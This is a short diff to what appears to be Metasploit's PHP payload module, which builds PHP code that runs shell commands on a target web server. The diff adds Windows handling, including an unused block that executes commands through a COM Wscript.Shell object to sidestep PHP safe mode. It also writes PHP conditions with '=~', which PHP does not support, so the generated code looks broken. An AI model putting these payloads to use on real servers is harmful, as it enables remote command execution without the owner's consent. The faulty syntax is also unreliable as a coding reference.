@@ -48,7 +48,9 @@ module Msf::Payload::Php
 		in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 		
 		setup = "
-			#{cmd}=#{cmd}.\" 2>&1\\n\";
+			if (!(strtolower(PHP_OS) =~ 'win')) {
+				#{cmd}=#{cmd}.\" 2>&1\\n\";
+			}
 			#{is_callable}='is_callable';
 			#{in_array}='in_array';
 			"
@@ -95,6 +97,15 @@ module Msf::Payload::Php
 					}
 				}
 				@pclose($fp);
+			}else"
+		# Currently unused until we can figure out how to get output with COM
+		# objects (which are not subject to safe mode restrictions) instead of
+		# PHP functions.
+		win32_com = "
+			if (strtolower(PHP_OS) =~ 'win') {
+				$wscript = new COM('Wscript.Shell');
+				$wscript->run(#{cmd} . ' > %TEMP%\\out.txt');
+				#{output} = file_get_contents('%TEMP%\\out.txt');
 			}else"
 		fail_block = "
 			{
